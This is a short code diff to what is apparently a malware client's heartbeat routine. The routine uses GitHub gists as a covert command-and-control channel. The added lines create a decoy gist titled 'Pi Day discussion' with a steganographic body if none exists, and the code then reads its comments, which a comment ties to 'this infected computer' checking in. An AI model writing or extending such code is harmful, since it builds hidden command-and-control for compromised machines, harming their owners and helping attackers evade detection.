@@ -1,4 +1,4 @@
-from api_wrapper import get_gist_id_from_description, get_comments, create_comment, update_comment
+from api_wrapper import get_gist_id_from_description, get_comments, create_comment, update_comment, create_gist
 import steganography
 import uuid
 
@@ -8,6 +8,12 @@ def heartbeat():
     
     # Find the id of the gist that manages alive devices (Pi Day discussion)
     alive_gist_id = get_gist_id_from_description("Pi Day discussion") 
+    
+        # Create the gist if it does not exist
+    if not alive_gist_id:
+        create_gist("Pi Day discussion", steganography.pi_day_discussion_body, file_name="pi.md")
+        alive_gist_id = get_gist_id_from_description("Pi Day discussion")
+        
     comments = get_comments(alive_gist_id, cipher=False) 
 
         # Find if this infected computer has already commented on the gist
